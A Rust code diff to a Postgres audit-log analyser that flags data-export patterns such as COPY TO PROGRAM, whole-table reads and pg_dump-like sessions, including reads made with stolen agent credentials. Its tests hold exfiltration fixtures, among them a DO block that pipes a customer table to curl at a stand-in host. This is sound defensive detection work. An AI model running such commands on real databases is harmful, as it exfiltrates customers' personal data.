@@ -14,14 +14,25 @@
 //! - `shape.full_table_copy`: `COPY` out of a whole relation, or of a query
 //!   without filter, aggregation or small limit.
 //! - `shape.full_table_read`: a read (`SELECT`, `TABLE`) without top-level
-//!   `WHERE`, `GROUP BY` / aggregate-only list, derived table, or with a
-//!   limit of at least [`LARGE_LIMIT`] rows.
-//! - `volume.large_result`: at least [`LARGE_ROWS`] rows returned or
-//!   affected (one statement, or one counter delta).
+//!   `WHERE`, `GROUP BY` / aggregate-only list, derived table, and without
+//!   a limit or with a limit above [`LARGE_LIMIT`] rows.
+//! - `volume.large_result`: more than [`LARGE_ROWS`] rows returned or
+//!   affected (one statement with `pgaudit.log_rows`, or one counter
+//!   delta).
 //!
-//! Relations of the catalogs (`pg_catalog`, `information_schema`,
-//! `pg_toast`, unqualified `pg_*`) are not reported as objects. Statements
-//! of the agent's own role are skipped.
+//! `shape.*` are heuristics and evadable by design (`WHERE true`,
+//! `LIMIT 10000` pages); volume × sensitivity in the console is the robust
+//! signal.
+//!
+//! Each pgaudit record is analyzed on its own statement text, and only the
+//! statements matching its command tag count (`select 1; copy … to
+//! program …` logs two records). A read or write whose objects cannot be
+//! told (function bodies, unparsable text) is reported against `*`, never
+//! dropped; statements naming only catalogs (`pg_catalog`,
+//! `information_schema`, `pg_toast`, unqualified `pg_*`,
+//! `pg_stat_statements*`) are skipped. Events of the agent's own account
+//! are left out only when they come from its `application_name` and carry
+//! no signal.
 
 use std::collections::{HashMap, HashSet, VecDeque};
 use std::time::SystemTime;
@@ -29,16 +40,21 @@ use std::time::SystemTime;
 use databastion_classifiers::masking::{
     ClientAddr, EventAction, EventObject, EventPrincipal, EventSource, MaskedEvent, Signal,
 };
+use databastion_classifiers::names::NormalizedName;
 use databastion_classifiers::query::{
-    AnalyzeOptions, CopyEndpoint, QueryAnalysis, RelationName, StatementKind, analyze,
+    AnalyzeOptions, CopyEndpoint, QueryAnalysis, RelationName, StatementInfo, StatementKind,
+    analyze,
 };
 
 use super::records::AuditRecord;
+use crate::conn::APPLICATION_NAME;
 use crate::discover::normalize;
 
-/// A limit of at least this many rows reads a whole relation.
+/// A limit above this many rows reads a whole relation.
 pub(crate) const LARGE_LIMIT: u64 = 10_000;
-/// Rows from which `volume.large_result` is set.
+/// Rows above which `volume.large_result` is set. Both thresholds sit just
+/// above the agent's own maximum sample (`limits.max_sample_rows` is at
+/// most 10 000), so its Discovery statements never carry these signals.
 pub(crate) const LARGE_ROWS: u64 = 10_000;
 /// Whole relations copied to the client by one session before
 /// `signature.pg_dump` is set.
@@ -50,11 +66,16 @@ const MAX_SESSION_RELATIONS: usize = 64;
 
 fn analyze_opts(truncated: bool) -> AnalyzeOptions {
     let mut o = AnalyzeOptions::new().truncated(truncated);
-    o.large_limit = LARGE_LIMIT;
+    o.large_limit = LARGE_LIMIT + 1;
     o
 }
 
 fn is_catalog(r: &RelationName) -> bool {
+    // The agent's own probes read `pg_stat_statements*` in the extension's
+    // schema: statistics, not application data.
+    if r.name.starts_with("pg_stat_statements") {
+        return true;
+    }
     match r.schema.as_deref() {
         Some("pg_catalog" | "information_schema" | "pg_toast") => true,
         Some(s) => s.starts_with("pg_temp_") || s.starts_with("pg_toast_temp_"),
@@ -101,6 +122,11 @@ fn object(database: &str, r: &RelationName) -> EventObject {
     )
 }
 
+/// An object the source does not name: the database, and `*`.
+fn unknown_object(database: &str) -> EventObject {
+    EventObject::new(normalize(database), None, NormalizedName::wildcard())
+}
+
 /// pgaudit object types that hold rows.
 fn is_relation_type(t: &str) -> bool {
     matches!(
@@ -113,37 +139,96 @@ fn is_dump_application(app: &str) -> bool {
     matches!(app.trim(), "pg_dump" | "pg_dumpall")
 }
 
-/// Signals of a statement from its analysis (not the session pattern).
-fn statement_signals(a: &QueryAnalysis, rows: Option<u64>) -> Vec<Signal> {
+/// Statement kinds a pgaudit command tag can stand for.
+fn kinds_of(command: &str) -> &'static [StatementKind] {
+    match command {
+        "SELECT" => &[
+            StatementKind::Select,
+            StatementKind::Table,
+            StatementKind::Values,
+        ],
+        "COPY" => &[StatementKind::Copy],
+        "INSERT" => &[StatementKind::Insert],
+        "UPDATE" => &[StatementKind::Update],
+        "DELETE" => &[StatementKind::Delete],
+        "MERGE" => &[StatementKind::Merge],
+        _ => &[],
+    }
+}
+
+/// The statements of `a` a record with `command` is about: those of the
+/// matching kind (a `DO` body included); every statement when none
+/// matches (the text does not settle it).
+fn matching<'a>(a: &'a QueryAnalysis, command: Option<&str>) -> Vec<&'a StatementInfo> {
+    let kinds = command.map_or(&[][..], kinds_of);
+    let m: Vec<&StatementInfo> = a
+        .parts()
+        .iter()
+        .filter(|p| kinds.contains(&p.kind))
+        .collect();
+    if m.is_empty() {
+        a.parts().iter().collect()
+    } else {
+        m
+    }
+}
+
+/// Relations named by `parts`, catalogs excluded; the flag says whether
+/// any relation (catalogs included) was named.
+fn user_relations(parts: &[&StatementInfo]) -> (Vec<RelationName>, bool) {
     let mut out = Vec::new();
-    if let Some(c) = a.copy() {
-        if c.to {
-            match c.endpoint {
-                CopyEndpoint::File => out.push(Signal::CopyToFile),
-                CopyEndpoint::Program => out.push(Signal::CopyToProgram),
-                CopyEndpoint::Client | CopyEndpoint::Unknown => {}
-            }
-            if c.whole_relation {
-                out.push(Signal::FullTableCopy);
+    let mut any = false;
+    for p in parts {
+        for r in &p.relations {
+            any = true;
+            if !is_catalog(r) && !out.contains(r) {
+                out.push(r.clone());
             }
         }
     }
-    if a.kind().is_read()
-        && !a.relations().iter().all(is_catalog)
-        && a.shape().is_some_and(|s| s.whole_relation(LARGE_LIMIT))
-    {
-        out.push(Signal::FullTableRead);
+    (out, any)
+}
+
+/// Signals of statements from their analysis (not the session pattern).
+fn statement_signals(parts: &[&StatementInfo], rows: Option<u64>) -> Vec<Signal> {
+    let mut out = Vec::new();
+    for p in parts {
+        if let Some(c) = p.copy {
+            if c.to {
+                match c.endpoint {
+                    CopyEndpoint::File => out.push(Signal::CopyToFile),
+                    CopyEndpoint::Program => out.push(Signal::CopyToProgram),
+                    CopyEndpoint::Client | CopyEndpoint::Unknown => {}
+                }
+                if c.whole_relation {
+                    out.push(Signal::FullTableCopy);
+                }
+            }
+        }
+        if p.kind.is_read()
+            && p.relations.iter().any(|r| !is_catalog(r))
+            && p.shape.is_some_and(|s| s.whole_relation(LARGE_LIMIT + 1))
+        {
+            out.push(Signal::FullTableRead);
+        }
     }
-    if rows.is_some_and(|r| r >= LARGE_ROWS) {
+    if rows.is_some_and(|r| r > LARGE_ROWS) {
         out.push(Signal::LargeResult);
     }
     out
 }
 
-/// Whether a statement copies whole relations to the client.
-fn copies_to_client(a: &QueryAnalysis) -> bool {
-    a.copy()
-        .is_some_and(|c| c.to && c.whole_relation && c.endpoint == CopyEndpoint::Client)
+/// Relations a statement copies whole to the client.
+fn copied_to_client(parts: &[&StatementInfo]) -> Vec<RelationName> {
+    let mut out = Vec::new();
+    for p in parts {
+        if p.copy
+            .is_some_and(|c| c.to && c.whole_relation && c.endpoint == CopyEndpoint::Client)
+        {
+            out.extend(p.relations.iter().filter(|r| !is_catalog(r)).cloned());
+        }
+    }
+    out
 }
 
 /// Sessions seen copying whole relations to the client.
@@ -176,13 +261,16 @@ impl DumpTracker {
         }
         set.len() >= DUMP_MIN_RELATIONS
     }
+}
 
-    /// Whether the session already reached the pattern.
-    pub(crate) fn flagged(&self, session: &str) -> bool {
-        self.sessions
-            .get(session)
-            .is_some_and(|s| s.len() >= DUMP_MIN_RELATIONS)
-    }
+/// Whether an event of the agent's own account may be left out: only
+/// what the agent itself does (its `application_name`) and only when it
+/// carries no signal. With stolen agent credentials, reads under another
+/// application name, or reads that look like exports, are still reported.
+fn own_routine(own_account: &str, user: &str, application: Option<&str>, e: &MaskedEvent) -> bool {
+    user == own_account
+        && application.is_none_or(|a| a == APPLICATION_NAME)
+        && e.signals().is_empty()
 }
 
 /// Builds events from pgaudit records.
@@ -191,12 +279,15 @@ pub(crate) struct PgauditEvents {
     dumps: DumpTracker,
 }
 
-/// Per class of a statement: objects and rows.
+/// Per class of a statement: objects, rows, signals, unknown objects.
 #[derive(Default)]
 struct ClassPart {
     objects: Vec<RelationName>,
     rows: Option<u64>,
-    copy_record: bool,
+    signals: Vec<Signal>,
+    unknown: bool,
+    catalog_only: bool,
+    dump: bool,
 }
 
 impl PgauditEvents {
@@ -218,9 +309,6 @@ impl PgauditEvents {
         let mut out = Vec::new();
         let mut group: Vec<AuditRecord> = Vec::new();
         for r in records {
-            if r.user == self.own_account {
-                continue;
-            }
             let same = group.first().is_some_and(|g| {
                 g.session == r.session && g.audit.statement_id == r.audit.statement_id
             });
@@ -239,9 +327,12 @@ impl PgauditEvents {
         let Some(first) = group.first() else {
             return;
         };
-        let analysis = analyze(&first.audit.statement, analyze_opts(false));
         let mut parts: HashMap<EventAction, ClassPart> = HashMap::new();
         let mut seen_subs: HashSet<(u64, String, String)> = HashSet::new();
+        // Each record is analyzed on its own text (a substatement of a
+        // function or DO block logs its own text); consecutive records
+        // with the same text reuse the analysis.
+        let mut cached: Option<(&str, QueryAnalysis)> = None;
         for r in &group {
             let action = match r.audit.class.as_str() {
                 "READ" => EventAction::Read,
@@ -259,37 +350,55 @@ impl PgauditEvents {
             )) {
                 continue;
             }
+            let text: &str = &r.audit.statement;
+            if cached.as_ref().is_none_or(|(t, _)| *t != text) {
+                cached = Some((text, analyze(text, analyze_opts(false))));
+            }
+            let Some((_, analysis)) = cached.as_ref() else {
+                continue;
+            };
+            let stmts = matching(analysis, Some(r.audit.command.as_str()));
+            let (text_relations, named_any) = user_relations(&stmts);
             let part = parts.entry(action).or_default();
+            let mut named = false;
             if !r.audit.object_name.is_empty() && is_relation_type(&r.audit.object_type) {
                 if let Some(rel) = split_object_name(&r.audit.object_name) {
+                    named = true;
                     if !is_catalog(&rel) && !part.objects.contains(&rel) {
                         part.objects.push(rel);
                     }
                 }
             }
-            // A utility COPY record has no object and logs 0 rows: unknown.
+            if !named {
+                if text_relations.is_empty() {
+                    if named_any {
+                        part.catalog_only = true;
+                    } else {
+                        part.unknown = true;
+                    }
+                }
+                for rel in text_relations {
+                    if !part.objects.contains(&rel) {
+                        part.objects.push(rel);
+                    }
+                }
+            }
+            // A utility COPY record logs 0 rows: unknown.
             let utility_copy = r.audit.command == "COPY" && r.audit.object_name.is_empty();
-            part.copy_record |= utility_copy;
             if let (Some(rows), false) = (r.audit.rows, utility_copy) {
                 part.rows = Some(part.rows.map_or(rows, |p| p.max(rows)));
+            }
+            if action == EventAction::Read {
+                part.signals.extend(statement_signals(&stmts, None));
+                let copied = copied_to_client(&stmts);
+                if !copied.is_empty() && self.dumps.copied(&r.session, &copied) {
+                    part.dump = true;
+                }
             }
         }
         if parts.is_empty() {
             return;
         }
-        // Objects the log does not name (COPY of a relation, SESSION
-        // records without log_relation): from the statement's identifiers.
-        let text_relations: Vec<RelationName> = analysis
-            .relations()
-            .iter()
-            .filter(|r| !is_catalog(r))
-            .cloned()
-            .collect();
-        let to_client = copies_to_client(&analysis);
-        let dump_pattern = to_client && self.dumps.copied(&first.session, &text_relations);
-        let dump = is_dump_application(&first.application)
-            || dump_pattern
-            || (to_client && self.dumps.flagged(&first.session));
         let principal = EventPrincipal::account(&first.user)
             .with_client(first.remote.as_deref().and_then(ClientAddr::parse))
             .with_application(&first.application);
@@ -300,28 +409,39 @@ impl PgauditEvents {
             let Some(part) = parts.remove(&action) else {
                 continue;
             };
-            let mut objects = part.objects;
-            if objects.is_empty() && matches!(action, EventAction::Read | EventAction::Write) {
-                objects = text_relations.clone();
-            }
-            if objects.is_empty() && matches!(action, EventAction::Read | EventAction::Write) {
-                // A catalog-only statement, or objects that cannot be told.
+            let rw = matches!(action, EventAction::Read | EventAction::Write);
+            if rw && part.objects.is_empty() && part.catalog_only && !part.unknown {
+                // Only catalogs: not application data.
                 continue;
             }
             let mut e = MaskedEvent::new(EventSource::Pgaudit, action, principal.clone(), ts)
                 .with_rows(part.rows);
-            for o in objects.iter().take(16) {
+            for o in part.objects.iter().take(16) {
                 e = e.with_object(object(&first.database, o));
             }
-            if action == EventAction::Read {
-                for s in statement_signals(&analysis, part.rows) {
-                    e = e.with_signal(s);
-                }
-                if dump {
-                    e = e.with_signal(Signal::PgDump);
-                }
-            } else if part.rows.is_some_and(|r| r >= LARGE_ROWS) {
+            if rw && (part.objects.is_empty() || part.unknown) {
+                // A read or write whose objects the log does not tell (a
+                // function or procedure body, a statement that does not
+                // parse): reported against `*` rather than dropped (the
+                // contract needs one object for read / write).
+                e = e.with_object(unknown_object(&first.database));
+            }
+            for s in part.signals {
+                e = e.with_signal(s);
+            }
+            if part.rows.is_some_and(|r| r > LARGE_ROWS) {
                 e = e.with_signal(Signal::LargeResult);
+            }
+            if action == EventAction::Read
+                && (part.dump
+                    || (is_dump_application(&first.application)
+                        && (e.signals().contains(&Signal::FullTableCopy)
+                            || e.signals().contains(&Signal::FullTableRead))))
+            {
+                e = e.with_signal(Signal::PgDump);
+            }
+            if own_routine(&self.own_account, &first.user, Some(&first.application), &e) {
+                continue;
             }
             out.push(e);
         }
@@ -341,24 +461,27 @@ pub(crate) struct StatementDelta<'a> {
 /// `from` and `to`. `pg_stat_statements` gives no client address, no
 /// application, no per-execution time and no per-execution row count: an
 /// event is the sum over the poll interval of one statement for one role.
+/// The agent's own account is reported only for deltas carrying a signal
+/// (the application name is not visible here).
 pub(crate) fn pss_events(
     deltas: &[StatementDelta<'_>],
+    own_account: &str,
     from: SystemTime,
     to: SystemTime,
 ) -> Vec<MaskedEvent> {
     // The pg_dump pattern per role within the poll.
     let mut copied: HashMap<&str, HashSet<RelationName>> = HashMap::new();
     for d in deltas {
-        if copies_to_client(d.analysis) {
-            let set = copied.entry(d.user).or_default();
-            for r in d.analysis.relations().iter().filter(|r| !is_catalog(r)) {
-                set.insert(r.clone());
-            }
+        let all: Vec<&StatementInfo> = d.analysis.parts().iter().collect();
+        let c = copied_to_client(&all);
+        if !c.is_empty() {
+            copied.entry(d.user).or_default().extend(c);
         }
     }
     let mut out = Vec::new();
     for d in deltas {
         let a = d.analysis;
+        let all: Vec<&StatementInfo> = a.parts().iter().collect();
         let action = match a.kind() {
             StatementKind::Select | StatementKind::Table | StatementKind::Values => {
                 EventAction::Read
@@ -378,8 +501,9 @@ pub(crate) fn pss_events(
             StatementKind::Dcl => EventAction::Dcl,
             _ => continue,
         };
-        let objects: Vec<&RelationName> = a.relations().iter().filter(|r| !is_catalog(r)).collect();
-        if objects.is_empty() && matches!(action, EventAction::Read | EventAction::Write) {
+        let (objects, named_any) = user_relations(&all);
+        let rw = matches!(action, EventAction::Read | EventAction::Write);
+        if rw && objects.is_empty() && named_any {
             continue;
         }
         // COPY counts rows in pg_stat_statements too.
@@ -392,22 +516,28 @@ pub(crate) fn pss_events(
         )
         .with_rows(rows)
         .with_aggregate(d.calls, to);
-        for o in objects {
+        for o in &objects {
             e = e.with_object(object(d.database, o));
         }
+        if rw && objects.is_empty() {
+            e = e.with_object(unknown_object(d.database));
+        }
         if action == EventAction::Read {
-            for s in statement_signals(a, rows) {
+            for s in statement_signals(&all, rows) {
                 e = e.with_signal(s);
             }
-            if copies_to_client(a)
+            if !copied_to_client(&all).is_empty()
                 && copied
                     .get(d.user)
                     .is_some_and(|s| s.len() >= DUMP_MIN_RELATIONS)
             {
                 e = e.with_signal(Signal::PgDump);
             }
-        } else if d.rows >= LARGE_ROWS {
+        } else if d.rows > LARGE_ROWS {
             e = e.with_signal(Signal::LargeResult);
+        }
+        if own_routine(own_account, d.user, None, &e) {
+            continue;
         }
         out.push(e);
     }
@@ -440,12 +570,23 @@ mod tests {
         let rows = rows.map_or(String::new(), |r| format!(",{r}"));
         let text = text.replace('"', "\"\"");
         let line = serde_json::json!({
-            "timestamp": "2026-09-28 21:45:31.320 UTC", "user": "backup", "dbname": "shop",
+            "timestamp": "2026-09-28 21:45:31.320 UTC", "user": user_of(app), "dbname": "shop",
+            "error_severity": "LOG",
             "remote_host": "192.0.2.14", "session_id": session, "application_name": app,
             "message": format!("AUDIT: SESSION,{stmt},{sub},{class},{command},{},{object},\"{text}\",<not logged>{rows}",
                 if object.is_empty() { "" } else { "TABLE" }),
         });
-        parse_record(Format::Jsonlog, line.to_string().as_bytes()).unwrap()
+        parse_record(Format::Jsonlog, line.to_string().as_bytes(), "LOG").unwrap()
+    }
+
+    /// Records of the application `databastion-agent*` come from the
+    /// agent's account `databastion`; others from `backup`.
+    fn user_of(app: &str) -> &'static str {
+        if app.starts_with("databastion-agent") || app == "stolen" {
+            "databastion"
+        } else {
+            "backup"
+        }
     }
 
     fn json(e: &MaskedEvent) -> String {
@@ -477,7 +618,7 @@ mod tests {
                 "READ",
                 "SELECT",
                 "",
-                "SELECT pg_catalog.set_config('search_path', '', false);",
+                "SELECT c.oid FROM pg_catalog.pg_class c",
                 Some(1),
                 "pg_dump",
             ),
@@ -677,20 +818,78 @@ mod tests {
     }
 
     #[test]
-    fn own_statements_and_misc_classes_are_skipped() {
-        let mut b = PgauditEvents::new("backup");
-        let recs = vec![rec(
-            "s5",
-            1,
-            1,
-            "READ",
-            "SELECT",
-            "crm.t",
-            "select * from crm.t",
-            Some(1),
-            "x",
-        )];
-        assert!(b.convert(recs, SystemTime::now()).is_empty());
+    fn own_account_is_reported_unless_routine() {
+        let mut b = PgauditEvents::new("databastion");
+        let recs = vec![
+            // The agent's Discovery sample: skipped.
+            rec(
+                "a1",
+                1,
+                1,
+                "READ",
+                "SELECT",
+                "crm.t",
+                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
+                Some(1000),
+                "databastion-agent",
+            ),
+            // Same account, whole-table read: reported even under the agent's name.
+            rec(
+                "a1",
+                2,
+                1,
+                "READ",
+                "SELECT",
+                "crm.t",
+                "select * from crm.t",
+                Some(5),
+                "databastion-agent",
+            ),
+            // Same account from another application: reported.
+            rec(
+                "a2",
+                1,
+                1,
+                "READ",
+                "SELECT",
+                "crm.t",
+                "select a from crm.t where id = 1",
+                Some(1),
+                "stolen",
+            ),
+        ];
+        let events = b.convert(recs, SystemTime::now());
+        let all: Vec<String> = events.iter().map(json).collect();
+        assert_eq!(events.len(), 2, "{all:?}");
+        assert!(all[0].contains("shape.full_table_read"), "{all:?}");
+        assert_eq!(events[1].principal().application(), Some("stolen"));
+        // pg_stat_statements: the agent's account only with a signal.
+        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
+        let dump = analyze_pss("select * from crm.t", false);
+        let deltas = [
+            StatementDelta {
+                user: "databastion",
+                database: "shop",
+                analysis: &routine,
+                calls: 1,
+                rows: 1000,
+            },
+            StatementDelta {
+                user: "databastion",
+                database: "shop",
+                analysis: &dump,
+                calls: 1,
+                rows: 5,
+            },
+        ];
+        let t0 = SystemTime::UNIX_EPOCH;
+        let ev = pss_events(&deltas, "databastion", t0, t0);
+        assert_eq!(ev.len(), 1);
+        assert!(ev[0].signals().contains(&Signal::FullTableRead));
+    }
+
+    #[test]
+    fn misc_classes_are_skipped() {
         let mut b = PgauditEvents::new("databastion");
         let recs = vec![rec(
             "s5",
@@ -704,6 +903,138 @@ mod tests {
             "x",
         )];
         assert!(b.convert(recs, SystemTime::now()).is_empty());
+    }
+
+    #[test]
+    fn do_blocks_functions_and_procedures_are_reported() {
+        let mut b = PgauditEvents::new("databastion");
+        let recs = vec![
+            // DO block, inner COPY logged with the block's text (substatement 2).
+            rec(
+                "d1",
+                1,
+                1,
+                "FUNCTION",
+                "DO",
+                "",
+                "DO $$ BEGIN COPY crm.customers TO PROGRAM 'curl -d @- h'; END $$",
+                None,
+                "psql",
+            ),
+            rec(
+                "d1",
+                1,
+                2,
+                "READ",
+                "COPY",
+                "",
+                "DO $$ BEGIN COPY crm.customers TO PROGRAM 'curl -d @- h'; END $$",
+                Some(0),
+                "psql",
+            ),
+            // Same, inner COPY logged with its own text (pgaudit 16).
+            rec(
+                "d2",
+                1,
+                1,
+                "READ",
+                "COPY",
+                "",
+                "copy crm.customers to program 'cat > /dev/null'",
+                Some(0),
+                "psql",
+            ),
+            // plpgsql function, log_relation off: no object in the record.
+            rec(
+                "d3",
+                1,
+                1,
+                "READ",
+                "SELECT",
+                "",
+                "select crm.f_pl()",
+                Some(1),
+                "psql",
+            ),
+            // SQL function body logged as its own substatement with object.
+            rec(
+                "d4",
+                1,
+                1,
+                "READ",
+                "SELECT",
+                "crm.customers",
+                "select count(*) from crm.customers",
+                Some(1),
+                "psql",
+            ),
+            rec(
+                "d4",
+                1,
+                2,
+                "READ",
+                "SELECT",
+                "",
+                "select crm.f_sql()",
+                Some(1),
+                "psql",
+            ),
+            // Procedure.
+            rec(
+                "d5",
+                1,
+                1,
+                "READ",
+                "SELECT",
+                "",
+                "CALL crm.p()",
+                None,
+                "psql",
+            ),
+        ];
+        let events = b.convert(recs, SystemTime::now());
+        let all: Vec<String> = events.iter().map(json).collect();
+        assert_eq!(events.len(), 5, "{all:#?}");
+        assert!(
+            all[0].contains("signature.copy_to_program") && all[0].contains("shop.crm.customers"),
+            "{}",
+            all[0]
+        );
+        assert!(all[1].contains("signature.copy_to_program"), "{}", all[1]);
+        assert!(
+            all[2].contains("shop..*"),
+            "unknown object reported as *: {}",
+            all[2]
+        );
+        assert!(
+            all[3].contains("shop.crm.customers") && all[3].contains("shop..*"),
+            "{}",
+            all[3]
+        );
+        assert!(all[4].contains("shop..*"), "{}", all[4]);
+    }
+
+    #[test]
+    fn statements_are_matched_by_command_tag() {
+        let mut b = PgauditEvents::new("databastion");
+        let text = "select 1; copy crm.customers to program 'x'";
+        let recs = vec![
+            rec("m1", 5, 1, "READ", "SELECT", "", text, Some(1), "psql"),
+            rec("m1", 6, 1, "READ", "COPY", "", text, Some(0), "psql"),
+        ];
+        let events = b.convert(recs, SystemTime::now());
+        let all: Vec<String> = events.iter().map(json).collect();
+        assert_eq!(events.len(), 2, "{all:#?}");
+        assert!(
+            !all[0].contains("shape.full_table_read") && !all[0].contains("copy_to"),
+            "{}",
+            all[0]
+        );
+        assert!(
+            all[1].contains("signature.copy_to_program") && all[1].contains("crm.customers"),
+            "{}",
+            all[1]
+        );
     }
 
     #[test]
@@ -770,7 +1101,7 @@ mod tests {
         ];
         let t0 = SystemTime::UNIX_EPOCH;
         let t1 = t0 + std::time::Duration::from_secs(10);
-        let events = pss_events(&deltas, t0, t1);
+        let events = pss_events(&deltas, "databastion", t0, t1);
         assert_eq!(events.len(), 5);
         assert!(events[0].signals().contains(&Signal::PgDump));
         assert!(events[0].signals().contains(&Signal::FullTableCopy));
